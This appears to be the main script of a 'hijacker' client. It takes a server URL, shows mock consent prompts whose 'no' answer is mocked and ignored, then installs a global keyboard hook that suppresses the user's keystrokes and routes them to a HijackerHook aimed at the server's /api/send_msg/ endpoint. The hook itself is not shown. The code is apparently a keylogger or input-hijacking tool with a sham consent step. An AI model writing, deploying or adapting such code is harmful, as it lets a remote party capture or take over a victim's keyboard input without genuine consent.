import logging
import os
from logging import Logger
from time import sleep
import atexit

import keyboard as kb
from magic_utils.custom_logger.loggingManager import setup_logger

from src.client.api import fetch_target_process_name
from src.client.hooks import HijackerHook

logger: Logger | None = None


def setup():
    global logger

    if not os.path.exists("logs"):
        os.mkdir("logs")

    setup_logger(
        logger_name="hijacker.app",
        stream_level=logging.INFO,
        log_file_name="logs/hijacker.log",
        stream_in_color=True,
        log_in_json=True,
        extra_log_args=None,
    )
    logger = logging.getLogger("hijacker.app")

    from src.client.config import settings
    settings.server_url = input("Enter the server URL: ")


def get_unnecessary_consent():
    prompts: list[str] = [
        "Do you want to continue? (y/n): ",
        "Are you sure? y/ (n or 0): ",
        "There is no coming back!!!! Are you sure u want to continue? y=Yes, n/0/False/f = No"
        "Ok this is the last chance, for your own protection, are you sure you want to continue? y=Yes, n/0/False/f = No"
    ]
    for prompt in prompts:
        valid_input = False
        while not valid_input:
            consent = input(prompt)
            if consent.lower() == "y":
                valid_input = True
            elif consent.lower() in ["n", "0", "False", "f"]:
                print("You never had a choice to begin with, heheheheheh (｀∀´)Ψ")
                return
            else:
                print("Invalid input, please try again. ( ô ‸ ō )....?????")
    print("You will regret this! Ψ(｀▽´)Ψ ")


def main():
    print("Initializing Setup...")
    setup()
    sleep(0.1)
    get_unnecessary_consent()
    sleep(1)

    logger.info("Initializing settings...")
    from src.client.config import settings

    target_process = fetch_target_process_name()

    hijacker_hook = HijackerHook(settings.server_url + "/api/send_msg/", target_process)
    logger.info("Hijacker initiated ...")

    kb.hook(hijacker_hook.hook, suppress=True)

    kb.wait('esc')
    logger.info("Hijacker terminated!")


if __name__ == '__main__':
    main()
